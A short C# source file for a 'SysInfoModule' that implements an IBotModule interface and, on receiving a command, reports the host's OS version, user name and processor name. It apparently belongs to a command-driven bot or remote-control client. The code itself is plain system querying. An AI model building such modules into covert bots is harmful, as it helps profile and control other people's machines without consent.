using System;

namespace Spindle.Modules {
    public class SysInfoModule : IBotModule {
        public string Identifier => "SYSINFO";

        public string CommandReceived(string command) {
            return $"{Identifier} {Environment.OSVersion};{Environment.UserName};{Program.GetObject("Win32_Processor", "Name")}";
        }
    }
}